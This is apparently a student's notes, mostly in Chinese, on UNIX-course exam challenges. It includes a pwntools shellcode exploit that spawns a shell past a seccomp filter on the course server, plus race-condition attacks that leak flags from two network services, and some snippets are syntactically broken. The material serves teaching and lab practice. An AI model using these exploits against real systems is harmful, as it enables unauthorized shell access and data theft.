final
===

## test_endian

`nc rhino.zoolab.org 30003`

後端程式用 MIPS 模擬器，這樣就能選要 little or big endian while running.

```
Please implement your is_big_endian() function to determine
whether the current CPU uses BIG endian or LITTLE endian.
Return 37 or 97 if you detect LITTLE endian or BIG endian, respectively.

Note: you cannot use any header files nor built-in C-library functions.

A bad implementation is pasted here for your reference:
======
long is_big_endian() {
    return 37; /* always reports LITTLE endian detected */
}
//EOF
======

Please paste your codes below, and
use a single line containing only '//EOF' to submit your codes.
=====

```

## math

`nc rhino.zoolab.org 30002`

```
Welcome to Integer Arithmatic Challenge

There are total 100 problems. Try your best!

Q: 320 + 353 =
```

## welcome

這題僅需 include 正確的東西，再把 bin 檔案 pipe 給這支程式

```c=
#define SHELLSIZE 4096

int main() {
    char * shellcode - mmap (NULL, SHELLSIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (shellcode == NULL) return -1;

    if(read(0, shellcode, SHELLSIZE == 0)) return -1;
    ((void (*)()) shellcode)();
}
```

## orw

就...ORW，用 seccomp 允許 open read write 而已。
因此丟 shellcode 過去就可以執行了。

## no_more_sys_code


```c=
/*
 * Exam problem set for UNIX programming course
 * by Chun-Ying Huang <chuang@cs.nctu.edu.tw>
 * License: GPLv2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>

#define SHELLSIZE	4096

void no_more_syscall() {
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if(ctx == NULL) exit(-1);
	if(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) < 0) exit(-1);
	if(seccomp_load(ctx) < 0) exit(-1);
	seccomp_release(ctx);
}

int main() {
	pid_t pid;
	int status;
	char *shellcode = mmap(NULL, SHELLSIZE,
		PROT_READ|PROT_WRITE|PROT_EXEC,
	       	MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	if(shellcode == NULL) return -1;

	if(read(0, shellcode, SHELLSIZE) <= 0) return -1;

	if((pid = fork()) == 0) {
		no_more_syscall();
		goto run;
	}

	if(wait(&status) == pid && status == 0) {
run:
		((void (*)()) shellcode)();
	}

	return 0;
}
```

我的錯誤解法：

```python=
#!/bin/env python3
from pwn import *

context.arch = "amd64"

sc = asm(
        "mov rax, [rbp - 0x14]\n"+
        "test rax, 0\n"+
        "je SC\n"+
        "mov rax, 0x3c\n"+
        "syscall\n"+
        "SC:\n"+
        shellcraft.amd64.linux.sh()
)

r = process("./a.out")
r.send(sc)
r.interactive()
```

老師的解答

```python

#!/bin/env python3
from pwn import *

context.arch = "amd64"

e = asm("""
        rdrand rax
        and rax, 1
        jz shell
        xor rax, rax
        xor rdi, rdi
        mov al, 60
        syscall
shell:
""" + shellcraft.amd64.linux.sh())

#r = process("./a.out")
r = remote("rhino.zoolab.org", 30011)
r.send(e)
r.interactive()
```

## shmflag

`nc rhino.zoolab.org 30004`

```
Implement getflag() function to read the flag from the share memory.
You have to print out the flag in your implemented function.
The key for the share memory is 0x12345678.

The prototype for getflag() function is: int getflag();

Note: you have to include all the required header files by yourself.
Please paste your codes below, and
use a single line containing only '//EOF' to submit your codes.
=====
```

這題記憶體是唯獨的，因此在設定時必須要把 flag 設定成唯讀，不然會失敗

```c=
int id;


if ((mem = shmat(id, NULL, SHM_RDONLY)) == (void*) -1) {
    perror(shmat");
    return -1;
}
printf("%d %p\n", id, mem");
printf("%s\n", );
```


## flagsrv

`nc rhino.zoolab.org 30012`

這題有給 source, 在 gethostbyname2() 有 race condition.

可以透過 `man 3 gethostbyname2` 去看

```
ATTRIBUTES
       For an explanation of the terms used in this section, see attributes(7).

       ┌───────────────────┬───────────────┬───────────────────────────────┐
       │Interface          │ Attribute     │ Value                         │
       ├───────────────────┼───────────────┼───────────────────────────────┤
       │gethostbyname()    │ Thread safety │ MT-Unsafe race:hostbyname env │
       │                   │               │ locale                        │
       ├───────────────────┼───────────────┼───────────────────────────────┤
       │gethostbyaddr()    │ Thread safety │ MT-Unsafe race:hostbyaddr env │
       │                   │               │ locale                        │
       ├───────────────────┼───────────────┼───────────────────────────────┤
       │sethostent(),      │ Thread safety │ MT-Unsafe race:hostent env    │
       │endhostent(),      │               │ locale                        │
       │gethostent_r()     │               │                               │
       ├───────────────────┼───────────────┼───────────────────────────────┤
       │herror(),          │ Thread safety │ MT-Safe                       │
       │hstrerror()        │               │                               │
       ├───────────────────┼───────────────┼───────────────────────────────┤
       │gethostent()       │ Thread safety │ MT-Unsafe race:hostent        │
       │                   │               │ race:hostentbuf env locale    │
       ├───────────────────┼───────────────┼───────────────────────────────┤
       │gethostbyname2()   │ Thread safety │ MT-Unsafe race:hostbyname2    │
       │                   │               │ env locale                    │
       ├───────────────────┼───────────────┼───────────────────────────────┤
       │gethostbyaddr_r(), │ Thread safety │ MT-Safe env locale            │
       │gethostbyname_r(), │               │                               │
       │gethostbyname2_r() │               │                               │
       └───────────────────┴───────────────┴───────────────────────────────┘
```

```
5 nc rhino.zoolab.org 30012
Welcome to the GetFlag Service!

==== Menu ====

[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do? g
Enter flag server addr/port: 0/10000
New job added: 0/10000

==== Menu ====

[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do? v

==== Job Status ====

Job #1: [0/10000] FLAG{GetH05TBYn@me2_i5_n0t_thr3@d_5@fe___u5e_it_w/_c@re!}
Job #2: <none>

==== Menu ====

[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do?
```




```c=
if(connect(s, (struct sockaddr*) &sin, sizeof(sin)) < 0)
    goto try_again
```

如果連到一個 port 不存在並且封包被 drop，則等他 timeout 後就會重連（因為 for 迴圈）

```
8 nc rhino.zoolab.org 30012
Welcome to the GetFlag Service!

==== Menu ====

[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do? g
Enter flag server addr/port: 172.217.160.78/10000
New job added: 172.217.160.78/10000

==== Menu ====

[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do? g
Enter flag server addr/port: 127.0.0.1/10000
New job added: 127.0.0.1/10000

==== Menu ====

[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do? v

==== Job Status ====

Job #1: [172.217.160.78/10000] Connecting to 172.217.160.78:10000 ... (1)
Job #2: [127.0.0.1/10000] Get from localhost is not allowed!

==== Menu ====

[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do? v

==== Job Status ====

Job #1: [172.217.160.78/10000] Connecting to 172.217.160.78:10000 ... (1)
Job #2: [127.0.0.1/10000] Get from localhost is not allowed!

==== Menu ====

[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do? v

==== Job Status ====

Job #1: [172.217.160.78/10000] FLAG{GetH05TBYn@me2_i5_n0t_thr3@d_5@fe___u5e_it_w/_c@re!}
Job #2: [127.0.0.1/10000] Get from localhost is not allowed!

==== Menu ====

[g] get flag from a server
[c] check job queue
[v] view job status
[q] quit

What do you want to do?
```

## unixfortune

`nc rhino.zoolab.org 30013`

這題是用 pthread，但是判斷權限的參數是 global variable，因此可以用 race condition 方式去讀到 flag。

```
11 nc rhino.zoolab.org 30013
Welcome to the UNIX Fortune database service.
Commands: [L] List fortunes; [Q] Quit
     .... or type a fortune name to read it.
L
==== List of Fortunes ====
LIST> -r-------- 1 1000 57 Dec 31 12:52 flag
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune000
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune001
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune002
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune003
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune004
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune005
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune006
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune007
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune008
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune009
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune010
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune011
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune012
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune013
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune014
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune015
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune016
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune017
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune018
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune019
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune020
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune021
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune022
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune023
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune024
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune025
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune026
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune027
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune028
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune029
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune030
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune031
LIST> -r--r--r-- 1 2000 77 Dec 31 13:47 fortune032
==== End of List =========
flag
ERROR> this file is protected from being read by a user.
fortune032
F> Sometimes, a grand adventure begins when you lick the evil. --Joe Pizzirusso
```

因此只要建立個 a.txt，類似這樣，送出去就好

```
flag
fortune000
flag
fortune000
flag
fortune000
flag
fortune000
flag
fortune000
flag
fortune000
flag

```
```
root@021212e435eb ~
14 nc rhino.zoolab.org 30013 < a.txt
Welcome to the UNIX Fortune database service.
Commands: [L] List fortunes; [Q] Quit
     .... or type a fortune name to read it.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
F> "Man invented language to satisfy his deep need to complain." -- Lily Tomlin
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
F> "Man invented language to satisfy his deep need to complain." -- Lily Tomlin
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
F> "Man invented language to satisfy his deep need to complain." -- Lily Tomlin
F> "Man invented language to satisfy his deep need to complain." -- Lily Tomlin
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
F> "Man invented language to satisfy his deep need to complain." -- Lily Tomlin
ERROR> this file is protected from being read by a user.
F> "Man invented language to satisfy his deep need to complain." -- Lily Tomlin
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
F> FLAG{b@d_imP1ement@ti0n_c0u1d_1e@d_2_r@ce_c0nditi0n5!!!}
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
F> "Man invented language to satisfy his deep need to complain." -- Lily Tomlin
ERROR> this file is protected from being read by a user.
ERROR> this file is protected from being read by a user.
F> "Man invented language to satisfy his deep need to complain." -- Lily Tomlin
```
